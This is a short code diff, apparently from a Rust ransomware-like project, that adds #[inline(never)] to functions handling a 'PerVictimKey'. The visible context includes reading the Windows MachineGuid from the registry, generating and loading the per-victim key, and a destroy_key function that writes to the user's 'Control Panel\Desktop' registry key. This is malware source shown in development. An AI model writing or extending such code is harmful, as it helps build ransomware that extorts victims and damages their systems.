@@ -151,6 +151,7 @@ fn save_key(key: &PerVictimKey) -> Result<(), io::Error> {
     result
 }
 
+#[inline(never)]
 fn get_machine_guid() -> Result<Uuid, GetMachineGuidError> {
     let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
     let regkey = hklm.open_subkey("SOFTWARE\\Microsoft\\Cryptography")?;
@@ -164,6 +165,7 @@ fn generate_key() -> Result<PerVictimKey, GenerateKeyError> {
     Ok(key)
 }
 
+#[inline(never)]
 pub fn ensure_key() -> Result<PerVictimKey, EnsureKeyError> {
     let result = load_key();
     if let Ok(key) = result {
@@ -172,6 +174,7 @@ pub fn ensure_key() -> Result<PerVictimKey, EnsureKeyError> {
     load_key().or_else(|e| generate_key().map_err(|ge| EnsureKeyError::CompositeError(e, ge)))
 }
 
+#[inline(never)]
 pub fn destroy_key() -> Result<(), io::Error> {
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
     let regkey = hkcu.open_subkey_with_flags("Control Panel\\Desktop", KEY_SET_VALUE)?;
